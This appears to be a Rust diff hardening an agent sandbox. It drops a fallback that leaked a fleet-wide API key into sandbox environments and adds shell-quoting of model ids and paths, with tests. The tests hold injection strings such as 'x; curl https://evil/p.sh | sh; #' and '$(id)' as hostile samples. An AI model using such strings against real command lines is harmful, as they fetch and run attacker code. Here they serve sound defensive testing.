@@ -61,13 +61,20 @@ pub const MCP_CONFIG_FILE: &str = "mcp.json";
 // the gateway is the only place it can enter the ledger, while the personas'
 // key has to stay unmetered there because the flow that drove the turn already
 // writes its row. One shared credential can only be one of those two things,
-// so harness runs were either invisible or doubled every persona turn. The
-// `:-` fallback keeps an operator-overridden fleet (LLM_BASE_URL pointed at a
-// raw upstream, so no gateway brain is provisioned) on the key it configured.
+// so harness runs were either invisible or doubled every persona turn.
+//
+// NO FALLBACK TO THE PERSONAS' KEY. This used to read
+// `${LLM_WORKBENCH_API_KEY:-${LLM_API_KEY}}` so an operator-overridden fleet
+// (LLM_BASE_URL at a raw upstream, no gateway brain provisioned) kept working
+// on the key it configured. The cost was that every Developer Agent sandbox —
+// a container that runs model-authored code from untrusted repos — could read
+// the fleet-wide, unmetered persona key out of its own environment. The
+// sandbox gets the workbench key and nothing else; an operator on a raw
+// upstream sets LLM_WORKBENCH_API_KEY explicitly.
 pub fn gateway_env() -> Map<String, Value> {
     [
         ("OPENAI_BASE_URL", "${LLM_BASE_URL}"),
-        ("OPENAI_API_KEY", "${LLM_WORKBENCH_API_KEY:-${LLM_API_KEY}}"),
+        ("OPENAI_API_KEY", "${LLM_WORKBENCH_API_KEY}"),
     ]
     .into_iter()
     .map(|(k, v)| (k.to_string(), Value::String(v.into())))
@@ -99,11 +106,36 @@ pub fn fill_cmd(tmpl: &str, model: Option<&str>, session_dir: &str) -> String {
 /// through one template filler so an invocation line can never end up with
 /// two prefixes or none.
 pub fn fill_cmd_arg(tmpl: &str, model_arg: Option<&str>, session_dir: &str) -> String {
-    let mut s = tmpl.replace("<sessionDir>", session_dir);
+    let mut s = tmpl.replace("<sessionDir>", &sh_quote(session_dir));
     if let Some(arg) = model_arg {
-        s = s.replace("<model>", arg);
+        s = s.replace("<model>", &sh_quote(arg));
     }
     s
+}
+
+/// A value as ONE shell word, whatever it holds.
+///
+/// Everything slotted into an invocation line is handed to the driving agent
+/// as "the command to run as written", so a value carrying a shell
+/// metacharacter would run as a command inside the sandbox. The routes that
+/// accept a model id already refuse anything outside the model-id grammar;
+/// this is the second fence, so the line is safe even for a value that got
+/// in some other way. A value made only of characters a POSIX shell never
+/// interprets passes through bare — the usual line stays readable — and
+/// anything else is single-quoted with the one escape single quotes need.
+pub fn sh_quote(s: &str) -> String {
+    let bare = !s.is_empty()
+        && s.bytes().all(|b| {
+            b.is_ascii_alphanumeric()
+                || matches!(
+                    b,
+                    b'.' | b'_' | b':' | b'/' | b'-' | b'@' | b'%' | b'+' | b'=' | b','
+                )
+        });
+    if bare {
+        return s.to_string();
+    }
+    format!("'{}'", s.replace('\'', "'\\''"))
 }
 
 /// Inline `KEY=value ` assignments to prefix an invocation line with, for the
@@ -128,7 +160,7 @@ pub fn role_env_prefix(roles: &[(String, String)]) -> String {
         };
         out.push_str(var);
         out.push('=');
-        out.push_str(arg);
+        out.push_str(&sh_quote(arg));
         out.push(' ');
     }
     out
@@ -241,16 +273,45 @@ async fn role_model(pg: &PgPool, weight: &str) -> Result<Option<String>, String>
     Ok(None)
 }
 
+// ── Is the sandbox the one the current render builds? ───────────────────────
+
+/// The shape of the rendered sandbox, as a token the container carries.
+///
+/// A render change only reaches a container when the agent is re-rendered
+/// and ROLLED, and nothing forced that or noticed it had not happened. The
+/// cont-init hook that hands the harness directories to the runtime user sat
+/// in the render, with a test, while the live fleet ran containers whose
+/// `/etc/cont-init.d` had never contained it — so a fix that was correct,
+/// reviewed and merged was absent from every agent, and the only symptom was
+/// a harness that would not start.
+///
+/// The render writes this token into the workbench config dir; `doctor`
+/// compares what the container carries against what this build expects and
+/// says "roll the agent" when they differ. **Bump it whenever the rendered
+/// sandbox shape changes** — a new mount, a changed hook, a new config file.
+/// Getting a stale answer is the failure this exists to make loud, so a
+/// forgotten bump is the one way it can still be quiet; the writability
+/// check in `doctor` is the backstop for that.
+pub const SANDBOX_SHAPE: &str = "2026-10-01.bun-global+own-hook";
+
+/// Where the render leaves it, read-only, inside the container.
+pub const SANDBOX_SHAPE_FILE: &str = "/opt/workbench-config/render-shape";
+
 #[cfg(test)]
 mod tests {
     use super::*;
 
     #[test]
-    fn omp_env_carries_the_workbench_key_fallback_and_its_config_dir() {
+    fn omp_env_carries_the_workbench_key_only_and_its_config_dir() {
         let env = omp_env();
         assert_eq!(
             env.get("OPENAI_API_KEY").and_then(Value::as_str),
-            Some("${LLM_WORKBENCH_API_KEY:-${LLM_API_KEY}}")
+            Some("${LLM_WORKBENCH_API_KEY}")
+        );
+        assert!(
+            !env.values()
+                .any(|v| v.as_str().is_some_and(|s| s.contains("LLM_API_KEY"))),
+            "the personas' key never reaches the sandbox env"
         );
         assert_eq!(
             env.get("OPENAI_BASE_URL").and_then(Value::as_str),
@@ -329,6 +390,51 @@ mod tests {
     }
 
     #[test]
+    fn a_value_with_shell_metacharacters_is_one_quoted_word() {
+        // The injection the grammar and the quoting both exist for.
+        let hostile = "x; curl https://evil/p.sh | sh; #";
+        assert_eq!(sh_quote(hostile), "'x; curl https://evil/p.sh | sh; #'");
+        // A single quote inside closes, escapes, and reopens.
+        assert_eq!(sh_quote("it's"), "'it'\\''s'");
+        // The empty string is still one word.
+        assert_eq!(sh_quote(""), "''");
+        // $(...), backticks, spaces, newlines: all quoted.
+        for v in ["$(id)", "`id`", "a b", "a\nb", "a\"b", "a&b", "a>b"] {
+            let q = sh_quote(v);
+            assert!(q.starts_with('\'') && q.ends_with('\''), "{v:?} -> {q}");
+        }
+        // The real vocabulary passes through bare, so the usual line is
+        // byte-for-byte what it was.
+        for v in [
+            "talaria/qwen3:14b",
+            "anthropic/claude-opus-4-5",
+            "/opt/data/workbench/sessions/abc",
+            "gpt-5.1",
+        ] {
+            assert_eq!(sh_quote(v), v);
+        }
+    }
+
+    #[test]
+    fn a_hostile_model_arg_cannot_break_out_of_the_line() {
+        let hostile = "talaria/x; curl https://evil/p.sh | sh; #";
+        let out = fill_cmd_arg(
+            OMP.json_invoke,
+            Some(hostile),
+            "/opt/data/workbench/sessions/abc",
+        );
+        assert!(
+            out.contains("--model 'talaria/x; curl https://evil/p.sh | sh; #' \"<task>\""),
+            "{out}"
+        );
+        let prefix = role_env_prefix(&[("smol".into(), hostile.into())]);
+        assert_eq!(
+            prefix,
+            "PI_SMOL_MODEL='talaria/x; curl https://evil/p.sh | sh; #' "
+        );
+    }
+
+    #[test]
     fn roles_become_omp_env_with_the_provider_prefix_and_skip_unresolved() {
         let roles = OmpRoles {
             default: Some("mid".into()),
@@ -361,27 +467,3 @@ mod tests {
         assert!(OmpRoles::default().model_ids().is_empty());
     }
 }
-
-// ── Is the sandbox the one the current render builds? ───────────────────────
-
-/// The shape of the rendered sandbox, as a token the container carries.
-///
-/// A render change only reaches a container when the agent is re-rendered
-/// and ROLLED, and nothing forced that or noticed it had not happened. The
-/// cont-init hook that hands the harness directories to the runtime user sat
-/// in the render, with a test, while the live fleet ran containers whose
-/// `/etc/cont-init.d` had never contained it — so a fix that was correct,
-/// reviewed and merged was absent from every agent, and the only symptom was
-/// a harness that would not start.
-///
-/// The render writes this token into the workbench config dir; `doctor`
-/// compares what the container carries against what this build expects and
-/// says "roll the agent" when they differ. **Bump it whenever the rendered
-/// sandbox shape changes** — a new mount, a changed hook, a new config file.
-/// Getting a stale answer is the failure this exists to make loud, so a
-/// forgotten bump is the one way it can still be quiet; the writability
-/// check in `doctor` is the backstop for that.
-pub const SANDBOX_SHAPE: &str = "2026-10-01.bun-global+own-hook";
-
-/// Where the render leaves it, read-only, inside the container.
-pub const SANDBOX_SHAPE_FILE: &str = "/opt/workbench-config/render-shape";
